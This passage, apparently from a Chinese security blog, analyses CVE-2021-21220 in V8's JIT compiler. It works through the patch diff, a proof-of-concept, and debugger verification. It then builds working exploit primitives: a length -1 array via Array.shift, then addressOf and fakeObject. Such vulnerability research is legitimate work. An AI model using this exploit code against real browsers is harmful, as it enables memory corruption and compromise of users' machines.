class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     0xdf200000000      0xdf20000d000 rw-p     d000 0</span><br><span class="line">     0xdf20000d000      0xdf200040000 ---p    33000 0</span><br><span class="line">     0xdf200040000      0xdf200170000 r-xp   130000 0</span><br><span class="line">     0xdf200170000      0xdf200180000 ---p    10000 0</span><br><span class="line">     0xdf200180000      0xdf200183000 rw-p     3000 0</span><br><span class="line">     0xdf200183000      0xdf200184000 ---p     1000 0</span><br><span class="line">     0xdf200184000      0xdf200194000 r-xp    10000 0</span><br><span class="line">     0xdf200194000      0xdf2001bf000 ---p    2b000 0</span><br><span class="line">     0xdf2001bf000      0xdf2001c0000 ---p     1000 0</span><br><span class="line">     0xdf2001c0000      0xdf2001c3000 rw-p     3000 0</span><br><span class="line">     0xdf2001c3000      0xdf2001c4000 ---p     1000 0</span><br><span class="line">     0xdf2001c4000      0xdf2001ff000 r-xp    3b000 0</span><br><span class="line">     0xdf2001ff000      0xdf208040000 ---p  7e41000 0</span><br><span class="line">     0xdf208040000      0xdf208061000 r--p    21000 0</span><br><span class="line">     0xdf208061000      0xdf208080000 ---p    1f000 0</span><br><span class="line">     0xdf208080000      0xdf20818d000 rw-p   10d000 0</span><br><span class="line">     0xdf20818d000      0xdf2081c0000 ---p    33000 0</span><br><span class="line">     0xdf2081c0000      0xdf2081c3000 rw-p     3000 0</span><br><span class="line">     0xdf2081c3000      0xdf208200000 ---p    3d000 0</span><br><span class="line">     0xdf208200000      0xdf2083c0000 rw-p   1c0000 0</span><br><span class="line">     0xdf2083c0000      0xdf300000000 ---p f7c40000 0</span><br><span class="line">    0x55fe3a44c000     0x55fe3ac71000 r--p   825000 0      /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ac71000     0x55fe3ba48000 r-xp   dd7000 824000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ba48000     0x55fe3bab5000 r--p    6d000 15fa000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3bab5000     0x55fe3bac4000 rw-p     f000 1666000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">...</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RCX  0xdf20013f500 ◂— push   rbp</span><br><span class="line"> RDX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fffaaa8fd00 —▸ 0xdf208042895 ◂— 0x80428</span><br><span class="line"> R8   0xdf20821289d ◂— 0x7500000006082442</span><br><span class="line"> R9   0x145</span><br><span class="line"> R10  0xc00000000</span><br><span class="line"> R11  0xfffffffffffffffa</span><br><span class="line"> R12  0x55fe3c799170 ◂— 0x0</span><br><span class="line"> R13  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> R14  0x55fe3ba73160 (v8::internal::kIntrinsicFunctions) ◂— 0x0</span><br><span class="line"> R15  0x55fe3c7975e0 ◂— 0x1baddead0baddeaf</span><br><span class="line"> RBP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RSP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RIP  0x55fe3b8ca445 (v8::base::OS::DebugBreak()+5) ◂— pop    rbp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现代CPU中的分支预测器非常好，并且代码大小（尤其是执行路径长度）对性能的影响更大。</p><p>具体的实现可以参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 / src / common / ptr-compr.h</span><br><span class="line">v8 / src / common / ptr-compr-inl.h</span><br></pre></td></tr></table></figure><h3 id="3、补丁对比"><a href="#3、补丁对比" class="headerlink" title="3、补丁对比"></a>3、补丁对比</h3><p>根据issue里面的补丁比较链接</p><p><a class="link"   href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381" >https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381<i class="fas fa-external-link-alt"></i></a></p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422093925521.png" alt="image-20210422093925521"></p><p>可以看出该bugfix的函数为ChangeInt32ToInt64，将32位整形数向64位进行拓展，修复之前的代码为判断传入的32位整型数是否为有符号从而选择movsx和mov，而修复后强制使用movsx进行有符号拓展。</p><h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）POC分析"><a href="#（1）POC分析" class="headerlink" title="（1）POC分析"></a>（1）POC分析</h4><p>POC与执行结果如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print = <span class="built_in">console</span>.log;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);<span class="comment">// 定义了一个只有一个元素的Uint32类型的数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;    <span class="comment">// 漏洞触发</span></span><br><span class="line">&#125; </span><br><span class="line">print(foo());<span class="comment">//-2147483647// 解释器工作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)<span class="comment">//代码价值提升，交由JIT处理</span></span><br><span class="line">    foo();</span><br><span class="line">print(foo());<span class="comment">//2147483649//JIT处理后的结果</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 test_jscode/d8_poc.js</span></span><br><span class="line">-2147483647</span><br><span class="line">2147483649</span><br></pre></td></tr></table></figure><p>我们对POC进行分析，首先分析arr数组元素</p><p>arr[0]是unsigned int32 = <code>2**31</code> = 2147483648 = 0x8000 0000</p><p> arr[0] ^ 0会转成signed int32 = 2**31^0 = 0x8000 0000 = -2147483648，至于为什么无符号操作数与0异或变为有符号，参考[4]。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422212700225.png" alt="image-20210422212700225"></p><p> (arr[0] ^ 0) + 1会转成signed int64，按理说是先符号拓展，得到0xFFFF FFFF 8000 0000，然后再加一，得到0xFFFF FFFF 8000 0001 = -2147483647</p><p>之后会解释器执行打印函数返回值以及JIT编译执行打印函数返回值</p><p>可以看到，在经过JIT优化前与优化后，foo的返回值是不相同的；这个从上面的补丁分析中我们也已经了解了，JIT在处理代码的时候将本该有符号拓展的数进行了无符号拓展。</p><h4 id="（2）执行流分析"><a href="#（2）执行流分析" class="headerlink" title="（2）执行流分析"></a>（2）执行流分析</h4><h5 id="SimplifiedLowering"><a href="#SimplifiedLowering" class="headerlink" title="SimplifiedLowering"></a>SimplifiedLowering</h5><p>在该阶段，通过#45 LoadTypedElement可以知道arr[0]的类型 Unsigned32，之后#31 Word32Xor处理之后类型为Signed32，之后+1需要做int32到int64的转换，调用了#58 ChangeInt32ToInt64，并将返回值与#59 Int64Constant[1]作为参数交由#50 ChangeInt32ToInt64处理。这段处理逻辑是没有问题的。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422210705763.png" alt="image-20210422210705763"></p><h5 id="MachineOperatorOptimization"><a href="#MachineOperatorOptimization" class="headerlink" title="MachineOperatorOptimization"></a>MachineOperatorOptimization</h5><p>而在该阶段，将arr[0] ^ 0通过JIT在#81 Load处获取运算所得的结果，此时该结果的类型为kRepWord32[kTypeUint32]，为<strong>无符号</strong>，此时仍然经过#58 ChangeInt32ToInt64进行处理。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422214123570.png" alt="image-20210422214123570"></p><p>而ChangeInt32ToInt64的处理如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">        opcode = load_rep.<span class="built_in">IsSigned</span>() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由于操作数时无符号，所以这里进行了无符号拓展，此时(arr[0] ^ 0) + 1的值为0 x 0000 0000 8000 0000 + 1，为2147483649。</p><h4 id="（3）动态验证"><a href="#（3）动态验证" class="headerlink" title="（3）动态验证"></a>（3）动态验证</h4><p>通过gdb验证下我们上述分析的过程，动态分析的思路为通过%DebugPrint输出得到arr元素的内存地址，然后下内存读断点，追踪到JIT处理foo函数的位置。</p><p>定位流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release# gdb d8</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test_jscode/d8_poc.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line">-2147483647</span><br><span class="line">DebugPrint: 0x4e60808851d: [JSTypedArray]</span><br><span class="line"> - map: 0x04e608243109 &lt;Map(UINT32ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; [UINT32ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x04e6080884d9 &lt;ArrayBuffer map = 0x4e6082431f9&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 4</span><br><span class="line"> - length: 1</span><br><span class="line"> - data_ptr: 0x4e608088518</span><br><span class="line">   - base_pointer: 0x8088511</span><br><span class="line">   - external_pointer: 0x4e600000007</span><br><span class="line"> - properties: 0x04e60804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; &#123;</span><br><span class="line">           0: 2147483648</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">0x4e608243109: [Map]</span><br><span class="line"> - type: JS_TYPED_ARRAY_TYPE</span><br><span class="line"> - instance size: 68</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: UINT32ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x04e6080423b5 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x04e608182405 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x04e6080421c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - constructor: 0x04e60820979d &lt;JSFunction Uint32Array (sfi = 0x4e608189721)&gt;</span><br><span class="line"> - dependent code: 0x04e608212aed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x04e608088511-1+8</span><br><span class="line">0x4e608088518:  0x80000000</span><br><span class="line">pwndbg&gt; rwatch *(int*)0x04e608088518</span><br><span class="line">Hardware read watchpoint 1: *(int*)0x04e60808851</span><br></pre></td></tr></table></figure><p>验证静态分析结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Thread 1 &quot;d8&quot; hit Hardware read watchpoint 1: *(int*)0x04e608088518</span><br><span class="line">Value = -2147483648</span><br><span class="line">0x000004e6001c4330 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line">*RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000000</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4e6001c4330    add    rcx, 1</span><br><span class="line">   0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; si</span><br><span class="line">0x000004e6001c4334 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000001</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line">   0x4e6001c4330    add    rcx, 1</span><br><span class="line"> ► 0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/5i 0x4e6001c432b</span><br><span class="line">   0x4e6001c432b:       add    rcx,r8</span><br><span class="line">   0x4e6001c432e:       mov    ecx,DWORD PTR [rcx]</span><br><span class="line">   0x4e6001c4330:       add    rcx,0x1</span><br><span class="line">=&gt; 0x4e6001c4334:       mov    edi,ecx</span><br><span class="line">   0x4e6001c4336:       movsxd r8,ecx</span><br></pre></td></tr></table></figure><p>观察到在执行完<strong>0x4e6001c432e</strong>处指令后，RCX 的值为 0x80000000，并没有进行有符号拓展，而执行完<strong>0x4e6001c4330</strong>后，RCX 的值为 0x80000001，验证了我们得到的结果。</p><h4 id="（4）EXP构造"><a href="#（4）EXP构造" class="headerlink" title="（4）EXP构造"></a>（4）EXP构造</h4><h5 id="（1）构造超长数组"><a href="#（1）构造超长数组" class="headerlink" title="（1）构造超长数组"></a>（1）构造超长数组</h5><p>从ChangeInt32ToInt64到将数组长度设置为-1，需要用到一种针对于JIT常用的利用技术：typer bug[6]，简单的理解就是在JavaScript函数的前几次调用期间，解释器记录各种操作的类型信息，例如参数访问和属性加载。如果以后选择该函数进行JIT编译，则V8的最新编译器TurboFan会假定在所有后续调用中都将使用观察到的类型，并使用从解释器中得出的规则集将类型信息传播到JIT。</p><p>我们将poc构造如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">x -= <span class="number">2147483647</span>;</span><br><span class="line">x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);<span class="comment">// predicted = 0; actual = 2</span></span><br><span class="line">x -= <span class="number">1</span>;   <span class="comment">// predicted = -1; actual = 1</span></span><br><span class="line"><span class="keyword">if</span>(x==-<span class="number">1</span>) x = <span class="number">0</span>;<span class="comment">// predicted = 0; actual = 1</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);<span class="comment">// predicted = 0; actual = 1</span></span><br><span class="line">arr.shift();<span class="comment">// predicted = 0; actual = -1，这里是比较难以理解的部分，之前解释器在处理shift的时候判断x的值为0，正常执行，所以在JIT阶段优化掉了边界检查；而在JIT阶段x==1，此时JIT仍将x的值当作0，由于x实际为1，所以shift将对数组长度做减一操作，再由于此时JIT将x的值当作0，所以最终数组的长度为0-1 == -1，这样构造出了超长的数组，可以进行很高的相对地址读写权限。</span></span><br><span class="line"><span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x30000</span>;++i)</span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line">print(x[<span class="number">0</span>].length);</span><br><span class="line">%DebugPrint(x[<span class="number">0</span>]);                    </span><br><span class="line">%SystemBreak();                                </span><br></pre></td></tr></table></figure><p>在LoadElimination阶段，可以看到将-1存储到#185 StoreElement，并传递给#184 StoreField 之后继续传递到#192 EffedtPhi，而调用#190 ArrayShift也会经由#192 EffectPhi处理得到的参数。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210428101114540.png" alt="image-20210428101114540"></p><p>调试验证结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">-1</span><br><span class="line">DebugPrint: 0x351f0833dd31: [JSArray]</span><br><span class="line"> - map: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x351f0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS];可见构建了超长数组：FixedArray[67244566]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x351f080446c1: [String] in ReadOnlySpace: #length: 0x351f0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x351f0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x351f0833dd25 &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x351f08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/10wx 0x351f0833dd24</span><br><span class="line">0x351f0833dd24: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x351f0833dd34: 0x0804222d      0x0833dd25      0xfffffffe      0x08042a95;0xfffffffe为-1，</span><br><span class="line">0x351f0833dd44: 0x00000006      0x9999999</span><br></pre></td></tr></table></figure><h5 id="（2）addressOf和fakeObject实现"><a href="#（2）addressOf和fakeObject实现" class="headerlink" title="（2）addressOf和fakeObject实现"></a>（2）addressOf和fakeObject实现</h5><p>之后确定arr和cor的偏移，方便通过对arr的相对地址读写进行addressOf和fakeObject的实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = x[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> cor = x[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> idx = <span class="number">6</span>;</span><br><span class="line"><span class="comment">//arr[idx+11] = 0x4242;  </span></span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x2333</span>;                           <span class="comment">//arr[idx+10]位置处存放cor的length属性，在这里可以将cor的长度扩展造成相对地址读写。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> f2big(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;         <span class="comment">//由于只有Array对象有shift方法，而Array对象的每个元素为四字节，我们只能泄露低四字节的地址（不排除有一些我不清楚的方法可以泄露八字节）,而这里的八字节因为前四字节已经被位运算清零了。实际上这里需要的也仅仅是四字节读写的能力，引擎会自动填充前面的基址。</span></span><br><span class="line">&#125;<span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = big2f(k);</span><br><span class="line">    <span class="keyword">return</span> arr[idx+<span class="number">1</span>];                          <span class="comment">//返回的也只是低四字节</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> test = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">test_addr = addressOf(test);</span><br><span class="line"><span class="built_in">console</span>.log(test_addr);</span><br><span class="line">%DebugPrint(test);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>简单介绍下上述代码，arr[idx+10]为cor的length属性，可以直接修改该值为大于原长度的值，这样cor数组也可以进行越界读写了，cor与arr的区别在于cor的相对读写可以操作八个字节。然后是addressOf与fakeObject原语的构造，在这里，由于arr和cor可以通过不同的索引值访问相同的空间，这样通过不同类型的数组读取出来的值的类型是不一样的（元素靠数组的map来确定类型），这样很容易就可以实现类型混淆。前面确定了cor与arr的内存相对偏移，便可以进行addressOf和fakeObject的实现。</p><p>调试来验证结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">000000000811d8b9</span><br><span class="line">DebugPrint: 0x19b00811d8b9: [JSArray]</span><br><span class="line"> - map: 0x19b0082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x19b00820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x19b00804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x19b0080446c1: [String] in ReadOnlySpace: #length: 0x19b00818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 